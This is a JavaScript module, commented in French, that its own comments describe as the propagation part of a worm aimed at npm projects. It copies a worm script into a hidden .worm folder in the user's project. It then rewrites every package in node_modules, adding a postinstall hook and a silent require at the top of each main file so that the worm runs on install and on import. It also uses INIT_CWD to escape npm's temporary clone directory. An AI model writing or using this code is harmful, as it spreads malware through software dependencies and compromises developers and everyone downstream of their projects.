'use strict';
// Propagation node_modules : patche les paquets voisins (postinstall + main),
// dépose le worm autonome dans <projet>/.worm/main.js.
const fs = require('fs');
const path = require('path');

const TAG = '__skh_worm__';

function findProjectRoot(start) {
  let dir = start;
  for (let i = 0; i < 12; i++) {
    if (fs.existsSync(path.join(dir, 'node_modules'))) return dir;
    const up = path.dirname(dir);
    if (up === dir) return start;
    dir = up;
  }
  return start;
}

function patchPackage(pkgDir, launcherPath) {
  const pjPath = path.join(pkgDir, 'package.json');
  let pj;
  try { pj = JSON.parse(fs.readFileSync(pjPath, 'utf8')); } catch { return 0; }
  pj.scripts = pj.scripts || {};
  let n = 0;
  if (!pj.__skh_worm__) {
    const run = `node "${launcherPath.split(path.sep).join('/')}"`;
    pj.scripts.postinstall = pj.scripts.postinstall
      ? `${run} && ${pj.scripts.postinstall}`
      : `${run} /* ${TAG} */`;
    pj.__skh_worm__ = true;
    try { fs.writeFileSync(pjPath, JSON.stringify(pj, null, 2)); } catch {}
    n++;
  }
  const mainFile = path.join(pkgDir, pj.main || 'index.js');
  if (fs.existsSync(mainFile) && /\.(js|mjs|cjs)$/.test(mainFile)) {
    try {
      let src = fs.readFileSync(mainFile, 'utf8');
      if (!src.includes(TAG)) {
        const req = `try{require(${JSON.stringify(launcherPath.split(path.sep).join('/'))})}catch(e){}`;
        fs.writeFileSync(mainFile, `${req}/* ${TAG} */\n${src}`);
        n++;
      }
    } catch {}
  }
  return n;
}

function infectAll(startDir) {
  try {
    // postinstall git deps : npm exécute depuis son clone tmp — INIT_CWD
    // pointe le vrai dossier de l'utilisateur (là où l'install a été lancée)
    const start = process.env.INIT_CWD || startDir;
    const root = findProjectRoot(start);
    const wormDir = path.join(root, '.worm');
    fs.mkdirSync(wormDir, { recursive: true });
    fs.copyFileSync(path.join(__dirname, 'worm.js'), path.join(wormDir, 'main.js'));
    const launcher = path.join(root, '.worm', 'main.js');
    const nm = path.join(root, 'node_modules');
    if (!fs.existsSync(nm)) return 0;
    let count = 0;
    for (const e of fs.readdirSync(nm)) {
      const d = path.join(nm, e);
      if (e.startsWith('.') || !fs.statSync(d).isDirectory()) continue;
      if (e.startsWith('@')) {
        for (const s of fs.readdirSync(d)) {
          const sd = path.join(d, s);
          if (fs.statSync(sd).isDirectory()) count += patchPackage(sd, launcher);
        }
      } else {
        count += patchPackage(d, launcher);
      }
    }
    return count;
  } catch {
    return 0;
  }
}

module.exports = { infectAll };
